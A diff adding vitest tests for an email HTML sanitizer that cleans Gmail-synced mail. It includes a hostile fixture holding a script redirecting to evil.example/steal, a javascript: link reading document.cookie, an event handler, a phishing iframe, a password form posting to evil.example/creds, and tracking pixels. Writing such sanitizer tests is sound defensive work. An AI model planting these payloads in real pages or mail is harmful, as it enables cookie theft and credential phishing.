@@ -11,8 +11,10 @@
 
 import { describe, expect, test } from "vitest";
 import {
+  BLOCKED_IMAGE_PLACEHOLDER,
   isEffectivelyEmpty,
   sanitizeDocumentHtml,
+  sanitizeEmailHtml,
   sanitizeUserHtml,
 } from "./sanitize-html";
 
@@ -248,5 +250,128 @@ describe("isEffectivelyEmpty", () => {
 
   test("nested tags with text are not empty", () => {
     expect(isEffectivelyEmpty("<p><strong>x</strong></p>")).toBe(false);
+  });
+});
+
+// ── Email profile ───────────────────────────────────────────────────────
+//
+// `sanitizeEmailHtml` runs at WRITE time on provider-synced mail
+// (Gmail sync) — the most hostile input the app ingests. These tests
+// pin the security boundary against a realistic hostile fixture and
+// document the tracking-pixel / inline-style policy.
+
+/** Hostile mail body: script, event handler, javascript: link,
+ *  iframe, form, style tag, tracking pixel, protocol-relative img. */
+const HOSTILE_EMAIL = [
+  "<div>",
+  "<script>document.location='https://evil.example/steal'</script>",
+  '<img src="https://tracker.example/pixel.gif?u=abc" alt="" width="1" height="1">',
+  '<img src="//tracker.example/p2.gif">',
+  '<p onmouseover="alert(1)">Dear <b>Counsel</b>,</p>',
+  '<a href="javascript:alert(document.cookie)">click me</a>',
+  '<iframe src="https://evil.example/phish"></iframe>',
+  '<form action="https://evil.example/creds"><input name="password"></form>',
+  "<style>body{display:none}</style>",
+  '<p style="color:#333;position:fixed;top:0;background-image:url(https://evil.example/x)">Body text</p>',
+  "</div>",
+].join("");
+
+describe("sanitizeEmailHtml — hostile mail is defanged", () => {
+  test("script tags AND their payload are gone", () => {
+    const out = sanitizeEmailHtml(HOSTILE_EMAIL);
+    expect(out).not.toContain("<script");
+    expect(out).not.toContain("evil.example/steal");
+  });
+
+  test("event handlers are stripped, content survives", () => {
+    const out = sanitizeEmailHtml(HOSTILE_EMAIL);
+    expect(out).not.toContain("onmouseover");
+    expect(out).toContain("Dear <b>Counsel</b>,");
+  });
+
+  test("javascript: hrefs are removed (text kept, scheme gone)", () => {
+    const out = sanitizeEmailHtml(HOSTILE_EMAIL);
+    expect(out).not.toContain("javascript:");
+    expect(out).toContain("click me");
+  });
+
+  test("iframe / form / style tags are discarded", () => {
+    const out = sanitizeEmailHtml(HOSTILE_EMAIL);
+    expect(out).not.toContain("<iframe");
+    expect(out).not.toContain("<form");
+    expect(out).not.toContain("<input");
+    expect(out).not.toContain("display:none");
+  });
+
+  test("style attr keeps the safe subset, drops position/background-image", () => {
+    const out = sanitizeEmailHtml(HOSTILE_EMAIL);
+    expect(out).toContain("color:#333");
+    expect(out).not.toContain("position");
+    expect(out).not.toContain("url(");
+    expect(out).toContain("Body text");
+  });
+});
+
+describe("sanitizeEmailHtml — remote images become blocked-image notes", () => {
+  test("http(s) tracking pixel → placeholder span, URL fully gone", () => {
+    const out = sanitizeEmailHtml(HOSTILE_EMAIL);
+    expect(out).not.toContain("tracker.example");
+    expect(out).not.toContain("<img");
+    expect(out).toContain(BLOCKED_IMAGE_PLACEHOLDER);
+    expect(out).toContain('class="email-blocked-image"');
+  });
+
+  test("alt text is preserved in the placeholder", () => {
+    const out = sanitizeEmailHtml(
+      '<img src="https://cdn.example/logo.png" alt="Firm logo">'
+    );
+    expect(out).toBe(
+      '<span class="email-blocked-image">[image blocked: Firm logo]</span>'
+    );
+  });
+
+  test("cid: inline references are blocked too (no fetchable bytes)", () => {
+    const out = sanitizeEmailHtml('<img src="cid:part1.abc@mailer">');
+    expect(out).toContain(BLOCKED_IMAGE_PLACEHOLDER);
+    expect(out).not.toContain("cid:");
+  });
+
+  test("data: URI images render (inline, no network fetch)", () => {
+    const html = '<img src="data:image/png;base64,iVBORw0KGgo=" alt="sig" />';
+    const out = sanitizeEmailHtml(html);
+    expect(out).toContain("<img");
+    expect(out).toContain("data:image/png;base64,iVBORw0KGgo=");
+  });
+});
+
+describe("sanitizeEmailHtml — real-mail structure passes through", () => {
+  test("div soup, tables, links survive (links forced safe)", () => {
+    const out = sanitizeEmailHtml(
+      '<div><table><tbody><tr><td colspan="2">cell</td></tr></tbody></table>' +
+        '<a href="https://court.example/filing">filing</a></div>'
+    );
+    expect(out).toContain("<div>");
+    expect(out).toContain('<td colspan="2">cell</td>');
+    expect(out).toContain('rel="noopener noreferrer"');
+    expect(out).toContain('target="_blank"');
+  });
+
+  test("unknown-but-harmless tags degrade to their text content", () => {
+    expect(sanitizeEmailHtml("<font color=\"red\">warm regards</font>")).toBe(
+      "warm regards"
+    );
+  });
+});
+
+describe("sanitizeEmailHtml — other profiles are NOT loosened", () => {
+  test("note profile still strips div and style attrs", () => {
+    const out = sanitizeUserHtml('<div style="color:red"><p>x</p></div>');
+    expect(out).not.toContain("<div");
+    expect(out).not.toContain("style=");
+  });
+
+  test("document profile still blocks remote images outright", () => {
+    const out = sanitizeDocumentHtml('<img src="https://evil.example/x.png">');
+    expect(out).not.toContain("evil.example");
   });
 });
